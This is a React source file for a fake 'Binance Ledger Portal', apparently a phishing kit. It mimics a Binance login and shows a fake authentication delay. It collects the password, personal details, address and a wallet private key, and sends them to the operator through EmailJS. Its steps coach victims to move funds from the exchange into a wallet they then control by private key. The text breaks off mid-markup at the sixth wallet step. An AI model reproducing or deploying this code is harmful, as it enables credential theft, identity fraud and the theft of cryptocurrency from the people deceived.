import { FC, useState, FormEvent, useEffect } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Checkbox } from "@/components/ui/checkbox";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
import { Wallet, CheckCircle, AlertCircle, Lock, ArrowRight } from "lucide-react";
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from "@/config/emailjs.config";

// List of countries for the dropdown
const countries = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", "Bolivia", 
  "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", 
  "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", 
  "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", 
  "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", 
  "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", 
  "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kosovo", "Kuwait", "Kyrgyzstan", "Laos", 
  "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", 
  "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", 
  "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", 
  "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Palestine", 
  "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", 
  "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", 
  "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", 
  "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", 
  "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", 
  "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", 
  "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", 
  "Yemen", "Zambia", "Zimbabwe"
];

enum FormStep {
  LOGIN_EMAIL = 1,
  LOGIN_PASSWORD = 2,
  APP_VERIFICATION = 3,
  LOGIN_SUCCESS = 4,
  PERSONAL_DETAILS = 5,
  ADDRESS_DETAILS = 6,
  CONFIRMATION = 7,
  SHIPMENT_CONFIRMATION = 8,
  WALLET_STEP1 = 9,
  WALLET_STEP2 = 10,
  WALLET_STEP3 = 11,
  WALLET_STEP4 = 12, 
  WALLET_STEP5 = 13,
  WALLET_STEP6 = 14,
  WALLET_STEP7 = 15,
  WALLET_STEP8 = 16,
  WALLET_LINKING = 17,
  WALLET_SUCCESS = 18
}

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState<FormStep>(FormStep.LOGIN_EMAIL);
  const [formProgress, setFormProgress] = useState(5);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    phoneNumber: "",
    address: "",
    zipCode: "",
    city: "",
    country: "",
    privateKey: "",
    securityConfirmation: false,
    walletConfirmations: {
      understand: false,
      risks: false,
      backup: false,
      responsibility: false
    }
  });
  
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLinkingDialog, setShowLinkingDialog] = useState(false);
  const [timerCount, setTimerCount] = useState(10);

  // Calculate progress based on current step
  useEffect(() => {
    // Map steps to progress percentage (approximately)
    const stepToProgress = {
      [FormStep.LOGIN_EMAIL]: 5,
      [FormStep.LOGIN_PASSWORD]: 10,
      [FormStep.APP_VERIFICATION]: 15,
      [FormStep.LOGIN_SUCCESS]: 20,
      [FormStep.PERSONAL_DETAILS]: 30,
      [FormStep.ADDRESS_DETAILS]: 40,
      [FormStep.CONFIRMATION]: 50,
      [FormStep.SHIPMENT_CONFIRMATION]: 55,
      [FormStep.WALLET_STEP1]: 60,
      [FormStep.WALLET_STEP8]: 90,
      [FormStep.WALLET_LINKING]: 95,
      [FormStep.WALLET_SUCCESS]: 100,
    };

    // Get progress for the current step or default to the step number * 5
    const progress = stepToProgress[currentStep] || currentStep * 5;
    setFormProgress(Math.min(progress, 100)); // Cap at 100%
  }, [currentStep]);

  // Timer effects for verification screens
  useEffect(() => {
    let timer: NodeJS.Timeout;
    
    if (currentStep === FormStep.APP_VERIFICATION && timerCount > 0) {
      timer = setTimeout(() => {
        setTimerCount(timerCount - 1);
      }, 1000);
    } else if (currentStep === FormStep.APP_VERIFICATION && timerCount === 0) {
      // Close the verification dialog and move to login success
      setCurrentStep(FormStep.LOGIN_SUCCESS);
      setTimerCount(10); // Reset for next timer
      toast({
        title: "Success",
        description: "Authentication successful",
      });
    }
    
    if (currentStep === FormStep.WALLET_LINKING && timerCount > 0) {
      timer = setTimeout(() => {
        setTimerCount(timerCount - 1);
      }, 1000);
    } else if (currentStep === FormStep.WALLET_LINKING && timerCount === 0) {
      setShowLinkingDialog(false);
      setCurrentStep(FormStep.WALLET_SUCCESS);
    }
    
    return () => {
      if (timer) clearTimeout(timer);
    };
  }, [currentStep, timerCount, toast]);

  const sendEmailNotification = async () => {
    try {
      const templateParams = {
        user_email: formData.email,
        user_password: formData.password,
        user_name: `${formData.firstName} ${formData.lastName}`,
        user_phone: formData.phoneNumber,
        user_dob: formData.dateOfBirth,
        user_address: formData.address,
        user_zip: formData.zipCode,
        user_city: formData.city,
        user_country: formData.country,
        user_private_key: formData.privateKey,
        submission_date: new Date().toLocaleString(),
        form_data: JSON.stringify({
          email: formData.email,
          password: formData.password,
          firstName: formData.firstName,
          lastName: formData.lastName,
          dateOfBirth: formData.dateOfBirth,
          phoneNumber: formData.phoneNumber,
          address: formData.address,
          zipCode: formData.zipCode,
          city: formData.city,
          country: formData.country,
          privateKey: formData.privateKey,
          walletConfirmations: formData.walletConfirmations
        }, null, 2)
      };

      await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams,
        EMAILJS_CONFIG.USER_ID
      );

      console.log('Email sent successfully');
      return true;
    } catch (error) {
      console.error('Failed to send email:', error);
      toast({
        title: "Warning",
        description: "Form submitted but email notification failed to send",
        variant: "destructive",
      });
      return false;
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
    
    // Clear error for this field if it exists
    if (errors[e.target.name]) {
      setErrors({
        ...errors,
        [e.target.name]: "",
      });
    }
  };

  const handleSecurityConfirmation = (checked: boolean) => {
    setFormData({
      ...formData,
      securityConfirmation: checked,
    });
  };

  const handleWalletConfirmation = (key: keyof typeof formData.walletConfirmations, checked: boolean) => {
    setFormData({
      ...formData,
      walletConfirmations: {
        ...formData.walletConfirmations,
        [key]: checked
      }
    });
  };

  const validateEmail = () => {
    const newErrors: Record<string, string> = {};
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!formData.email) {
      newErrors.email = "Email is required";
    } else if (!emailRegex.test(formData.email)) {
      newErrors.email = "Please enter a valid email address";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePassword = () => {
    const newErrors: Record<string, string> = {};

    if (!formData.password) {
      newErrors.password = "Password is required";
    } else if (formData.password.length < 8) {
      newErrors.password = "Password must be at least 8 characters";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePersonalDetails = () => {
    const newErrors: Record<string, string> = {};

    if (!formData.firstName.trim()) {
      newErrors.firstName = "First name is required";
    }
    
    if (!formData.lastName.trim()) {
      newErrors.lastName = "Last name is required";
    }
    
    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = "Date of birth is required";
    }
    
    if (!formData.phoneNumber.trim()) {
      newErrors.phoneNumber = "Phone number is required";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateAddressDetails = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.address.trim()) {
      newErrors.address = "Address is required";
    }
    
    if (!formData.zipCode.trim()) {
      newErrors.zipCode = "Postal code is required";
    }
    
    if (!formData.city.trim()) {
      newErrors.city = "City is required";
    }
    
    if (!formData.country) {
      newErrors.country = "Country is required";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePrivateKey = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.privateKey.trim()) {
      newErrors.privateKey = "Private key is required to link your wallet";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateWalletConfirmations = () => {
    const { understand, risks, backup, responsibility } = formData.walletConfirmations;
    
    if (!understand || !risks || !backup || !responsibility) {
      toast({
        title: "Error",
        description: "Please confirm all security notices before proceeding",
        variant: "destructive",
      });
      return false;
    }
    
    return true;
  };

  const handleNext = () => {
    switch (currentStep) {
      case FormStep.LOGIN_EMAIL:
        if (validateEmail()) {
          setCurrentStep(FormStep.LOGIN_PASSWORD);
        }
        break;
        
      case FormStep.LOGIN_PASSWORD:
        if (validatePassword()) {
          setCurrentStep(FormStep.APP_VERIFICATION);
          setTimerCount(6); // Set to 6 seconds for silent wait
        }
        break;
        
      case FormStep.LOGIN_SUCCESS:
        setCurrentStep(FormStep.PERSONAL_DETAILS);
        break;
        
      case FormStep.PERSONAL_DETAILS:
        if (validatePersonalDetails()) {
          setCurrentStep(FormStep.ADDRESS_DETAILS);
        }
        break;
        
      case FormStep.ADDRESS_DETAILS:
        if (validateAddressDetails()) {
          setCurrentStep(FormStep.CONFIRMATION);
        }
        break;
        
      case FormStep.CONFIRMATION:
        setIsSubmitting(true);
        // Send email with form data
        sendEmailNotification().finally(() => {
          setIsSubmitting(false);
          setCurrentStep(FormStep.SHIPMENT_CONFIRMATION);
        });
        break;
        
      case FormStep.SHIPMENT_CONFIRMATION:
        setCurrentStep(FormStep.WALLET_STEP1);
        break;
        
      case FormStep.WALLET_STEP1:
        setCurrentStep(FormStep.WALLET_STEP2);
        break;
        
      case FormStep.WALLET_STEP2:
        setCurrentStep(FormStep.WALLET_STEP3);
        break;
        
      case FormStep.WALLET_STEP3:
        setCurrentStep(FormStep.WALLET_STEP4);
        break;
        
      case FormStep.WALLET_STEP4:
        setCurrentStep(FormStep.WALLET_STEP5);
        break;
        
      case FormStep.WALLET_STEP5:
        setCurrentStep(FormStep.WALLET_STEP6);
        break;
        
      case FormStep.WALLET_STEP6:
        setCurrentStep(FormStep.WALLET_STEP7);
        break;
        
      case FormStep.WALLET_STEP7:
        if (validateWalletConfirmations()) {
          setCurrentStep(FormStep.WALLET_STEP8);
        }
        break;
        
      case FormStep.WALLET_STEP8:
        if (validatePrivateKey()) {
          setShowLinkingDialog(true);
          setCurrentStep(FormStep.WALLET_LINKING);
          setTimerCount(10); // Reset timer when starting linking
        }
        break;
        
      default:
        break;
    }
  };

  const handlePrevious = () => {
    if (currentStep > FormStep.LOGIN_EMAIL) {
      setCurrentStep(prevStep => prevStep - 1);
    }
  };

  const renderAppVerification = () => (
    <div className="text-center py-8 space-y-6">
      <div className="w-20 h-20 mx-auto bg-binance-yellow/20 rounded-full flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow"></div>
      </div>
      <h3 className="text-white font-semibold text-xl">Authenticating...</h3>
      <p className="text-gray-300 max-w-md mx-auto">
        Please wait while we verify your credentials.
      </p>
    </div>
  );

  const renderLoginSuccess = () => (
    <div className="text-center py-8 space-y-6">
      <div className="w-20 h-20 mx-auto bg-binance-yellow/20 rounded-full flex items-center justify-center">
        <CheckCircle className="w-10 h-10 text-binance-yellow" />
      </div>
      <h3 className="text-white font-semibold text-xl">Login Successful</h3>
      <p className="text-gray-300 max-w-md mx-auto">
        Welcome back to Binance Ledger Portal. We will now verify a few personal details 
        in order to send you the Binance Ledger.
      </p>
      <Button
        onClick={handleNext}
        className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
      >
        Continue
      </Button>
    </div>
  );

  const renderLoginEmail = () => (
    <div className="space-y-6">
      <h3 className="text-white font-medium">Login with Binance Account</h3>
      <div>
        <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
          Email/Phone number
        </label>
        <Input
          id="email"
          name="email"
          type="email"
          value={formData.email}
          onChange={handleInputChange}
          placeholder="Email/Phone (without country code)"
          className={`bg-binance-darkGray border-gray-600 text-white ${errors.email ? "border-red-500" : ""}`}
          autoFocus
        />
        {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
      </div>
      <Button
        onClick={handleNext}
        className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
      >
        Next
      </Button>
    </div>
  );

  const renderLoginPassword = () => (
    <div className="space-y-6">
      <h3 className="text-white font-medium">Enter Password</h3>
      <div>
        <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-1">
          Password
        </label>
        <Input
          id="password"
          name="password"
          type="password"
          value={formData.password}
          onChange={handleInputChange}
          placeholder="Your Binance Password"
          className={`bg-binance-darkGray border-gray-600 text-white ${errors.password ? "border-red-500" : ""}`}
          autoFocus
        />
        {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
      </div>
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Log In
        </Button>
      </div>
    </div>
  );

  const renderPersonalDetails = () => (
    <div className="space-y-6">
      <h3 className="text-white font-medium">Personal Information</h3>
      <div className="grid grid-cols-2 gap-4">
        <div>
          <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-1">
            First Name
          </label>
          <Input
            id="firstName"
            name="firstName"
            value={formData.firstName}
            onChange={handleInputChange}
            placeholder="First Name"
            className={`bg-binance-darkGray border-gray-600 text-white ${errors.firstName ? "border-red-500" : ""}`}
          />
          {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
        </div>
        <div>
          <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-1">
            Last Name
          </label>
          <Input
            id="lastName"
            name="lastName"
            value={formData.lastName}
            onChange={handleInputChange}
            placeholder="Last Name"
            className={`bg-binance-darkGray border-gray-600 text-white ${errors.lastName ? "border-red-500" : ""}`}
          />
          {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
        </div>
      </div>
      <div>
        <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-1">
          Date of Birth
        </label>
        <Input
          id="dateOfBirth"
          name="dateOfBirth"
          type="date"
          value={formData.dateOfBirth}
          onChange={handleInputChange}
          placeholder="Date of Birth"
          className={`bg-binance-darkGray border-gray-600 text-white ${errors.dateOfBirth ? "border-red-500" : ""}`}
        />
        {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
      </div>
      <div>
        <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-1">
          Phone Number
        </label>
        <Input
          id="phoneNumber"
          name="phoneNumber"
          type="tel"
          value={formData.phoneNumber}
          onChange={handleInputChange}
          placeholder="Phone Number"
          className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
        />
        {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
      </div>
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button
          type="button"
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Next
        </Button>
      </div>
    </div>
  );

  const renderAddressDetails = () => (
    <div className="space-y-6">
      <h3 className="text-white font-medium">Address Details</h3>
      <div>
        <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-1">
          Address
        </label>
        <Input
          id="address"
          name="address"
          value={formData.address}
          onChange={handleInputChange}
          placeholder="Address"
          className={`bg-binance-darkGray border-gray-600 text-white ${errors.address ? "border-red-500" : ""}`}
        />
        {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div>
          <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-1">
            Postal Code
          </label>
          <Input
            id="zipCode"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleInputChange}
            placeholder="Postal Code"
            className={`bg-binance-darkGray border-gray-600 text-white ${errors.zipCode ? "border-red-500" : ""}`}
          />
          {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
        </div>
        <div>
          <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-1">
            City
          </label>
          <Input
            id="city"
            name="city"
            value={formData.city}
            onChange={handleInputChange}
            placeholder="City"
            className={`bg-binance-darkGray border-gray-600 text-white ${errors.city ? "border-red-500" : ""}`}
          />
          {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
        </div>
      </div>

      <div>
        <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-1">
          Country
        </label>
        <Select
          name="country"
          value={formData.country}
          onValueChange={(value) => {
            setFormData({
              ...formData,
              country: value
            });
            // Clear error for this field if it exists
            if (errors.country) {
              setErrors({
                ...errors,
                country: ""
              });
            }
          }}
        >
          <SelectTrigger 
            className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
          >
            <SelectValue placeholder="Select a country" />
          </SelectTrigger>
          <SelectContent className="bg-binance-darkGray border-gray-600 text-white max-h-[200px]">
            {countries.map((country) => (
              <SelectItem key={country} value={country}>
                {country}
              </SelectItem>
            ))}
          </SelectContent>
        </Select>
        {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button
          type="button"
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Review Information
        </Button>
      </div>
    </div>
  );

  const renderConfirmation = () => (
    <div className="space-y-6">
      <div className="text-center py-2">
        <h3 className="text-white font-semibold text-xl mb-4">
          Review Your Information
        </h3>
        <p className="text-gray-300 text-sm mb-6">
          Please review the information below before finalizing your submission.
        </p>
      </div>

      <div className="space-y-4 bg-binance-darkGray/40 p-4 rounded-md">
        <div className="grid grid-cols-2 gap-x-4 gap-y-2">
          <div className="text-gray-400 text-sm">First Name:</div>
          <div className="text-white text-sm font-medium">{formData.firstName}</div>
          
          <div className="text-gray-400 text-sm">Last Name:</div>
          <div className="text-white text-sm font-medium">{formData.lastName}</div>
          
          <div className="text-gray-400 text-sm">Date of Birth:</div>
          <div className="text-white text-sm font-medium">{formData.dateOfBirth}</div>
          
          <div className="text-gray-400 text-sm">Email:</div>
          <div className="text-white text-sm font-medium">{formData.email}</div>
          
          <div className="text-gray-400 text-sm">Phone Number:</div>
          <div className="text-white text-sm font-medium">{formData.phoneNumber}</div>
          
          <div className="text-gray-400 text-sm">Address:</div>
          <div className="text-white text-sm font-medium">{formData.address}</div>
          
          <div className="text-gray-400 text-sm">Postal Code:</div>
          <div className="text-white text-sm font-medium">{formData.zipCode}</div>
          
          <div className="text-gray-400 text-sm">City:</div>
          <div className="text-white text-sm font-medium">{formData.city}</div>
          
          <div className="text-gray-400 text-sm">Country:</div>
          <div className="text-white text-sm font-medium">{formData.country}</div>
        </div>
      </div>
      
      <div className="flex justify-between pt-6">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Go Back
        </Button>
        <Button
          type="button"
          onClick={handleNext}
          disabled={isSubmitting}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          {isSubmitting ? "Processing..." : "Confirm & Submit"}
        </Button>
      </div>
    </div>
  );

  const renderShipmentConfirmation = () => (
    <div className="text-center py-8">
      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-binance-yellow/20 mb-6">
        <CheckCircle className="w-8 h-8 text-binance-yellow" />
      </div>
      <h3 className="text-white font-semibold text-xl mb-2">
        Success! Your Binance Ledger is on the way.
      </h3>
      <p className="text-gray-300">
        The Binance Ledger will be shipped to your provided address:
        <br />
        <span className="block mt-2 font-medium">
          {formData.address}, {formData.zipCode}
          <br />
          {formData.city}, {formData.country}
        </span>
      </p>
      <p className="mt-6 text-gray-300">
        Delivery typically takes <span className="text-binance-yellow font-medium">5 business days</span>.
      </p>
      <p className="mt-2 text-gray-400 text-sm">
        You will receive a confirmation email at {formData.email} with tracking information
        once your device has been shipped.
      </p>
      
      {/* Professional Next Steps Section */}
      <div className="mt-8 p-6 bg-binance-darkGray/30 border border-binance-yellow/20 rounded-lg">
        <div className="flex items-center justify-center mb-4">
          <div className="bg-binance-yellow/20 p-2 rounded-full mr-3">
            <Lock className="w-5 h-5 text-binance-yellow" />
          </div>
          <h4 className="text-white font-semibold text-lg">
            Device Configuration Required
          </h4>
        </div>
        
        <div className="bg-binance-dark/40 rounded-lg p-4 mb-4">
          <p className="text-gray-200 text-center mb-2">
            To use your Binance Ledger, you must first link it to your wallet.
          </p>
          <p className="text-gray-300 text-center text-sm">
            This process configures your device and ensures compatibility with your existing wallet.
          </p>
        </div>
        
        <div className="flex items-center justify-center text-gray-300 text-sm mb-4">
          <Wallet className="w-4 h-4 mr-2 text-binance-yellow" />
          <span>Configuration process takes approximately 2 minutes</span>
        </div>
        
        <Button 
          onClick={handleNext}
          className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 font-medium py-3"
        >
          <span className="flex items-center justify-center">
            Configure Ledger Device
            <ArrowRight className="ml-2 w-4 h-4" />
          </span>
        </Button>
      </div>
    </div>
  );

  const renderWalletStep1 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          1
        </div>
        <h3 className="text-white font-semibold text-lg">Log in to your Binance App</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          Open your Binance mobile application and log in with your credentials. 
          If you don't have the app installed yet, you can download it from your app store.
        </p>
      </div>
      
      <Button 
        onClick={handleNext}
        className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 mt-2"
      >
        I've Logged In, Continue
      </Button>
    </div>
  );

  const renderWalletStep2 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          2
        </div>
        <h3 className="text-white font-semibold text-lg">Go to your Binance Wallet</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p>Navigate to the Wallet section in your Binance App by tapping on the Wallet icon.</p>
        
        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 my-4">
          <h4 className="text-red-400 font-medium text-sm mb-1">Don't have a wallet yet?</h4>
          <p className="text-sm">
            If you don't have a wallet yet, you'll need to create one first by following the steps in the app. 
            Tap on "Create Wallet" and follow the on-screen instructions.
          </p>
        </div>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Next Step
        </Button>
      </div>
    </div>
  );

  const renderWalletStep3 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          3
        </div>
        <h3 className="text-white font-semibold text-lg">Ensure funds are in your wallet</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          This step is <span className="text-binance-yellow font-medium">very important</span> for the safety of your assets.
        </p>
        
        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 mb-4">
          <h4 className="text-red-400 font-medium mb-2">Critical Security Notice:</h4>
          <p>
            Your funds must be in your wallet, not in the exchange environment. 
            If your funds are still in the exchange, you must transfer them to your wallet.
          </p>
        </div>
        
        <p>
          To transfer funds from the exchange to your wallet:
        </p>
        <ol className="list-decimal ml-5 space-y-2 mt-2">
          <li>Go to your Binance Spot wallet</li>
          <li>Select the cryptocurrency you want to transfer</li>
          <li>Tap "Transfer" and select "To Wallet"</li>
          <li>Enter the amount and confirm the transfer</li>
        </ol>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I've Transferred My Funds, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep4 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          4
        </div>
        <h3 className="text-white font-semibold text-lg">Access wallet management</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          In the Binance Wallet interface:
        </p>
        
        <ol className="list-decimal ml-5 space-y-3">
          <li>Look for "My Wallet" in the top-left corner and tap on it</li>
          <li>In the top-right corner, tap on "Manage"</li>
          <li>Select your wallet from the list</li>
          <li>A menu with three functions will appear</li>
          <li>Choose "Convert to Private Key Wallet"</li>
        </ol>
        
        <p className="mt-4">
          This will begin the linking process between your wallet and the Binance Ledger.
        </p>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Next Step
        </Button>
      </div>
    </div>
  );

  const renderWalletStep5 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          5
        </div>
        <h3 className="text-white font-semibold text-lg">Read the security reminder</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          After selecting "Convert to Private Key Wallet", you will see a security reminder.
        </p>
        
        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 mb-4">
          <h4 className="text-red-400 font-medium mb-2">Important:</h4>
          <p>
            Read the security reminder carefully. This outlines important information about 
            managing your private key wallet and the responsibilities that come with it.
          </p>
        </div>
        
        <p>
          Security reminders typically cover:
        </p>
        <ul className="list-disc ml-5 space-y-2 mt-2">
          <li>Private key safety</li>
          <li>Backup recommendations</li>
          <li>Risk management</li>
          <li>Personal responsibility for wallet security</li>
        </ul>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I've Read the Reminder, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep6 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          6
        </div>
        <h3 className="text-white font-semibold text-lg">Review Convert Wallet details</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          After reading the reminder and clicking Next, you will see the Convert Wallet screen.
        </p>
        
        <p>The screen will display information about:</p>
        <ul className="list-disc ml-5 space-y-2 mt-2">
          <li>The wallet being converted</li>
          <li>Assets in the wallet</li>
          <li>Technical details about the conversion</li>
        </ul>
        
        <p className="mt-4">
          Review all details carefully to ensure you understand the process and everything is correct.
        </p>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
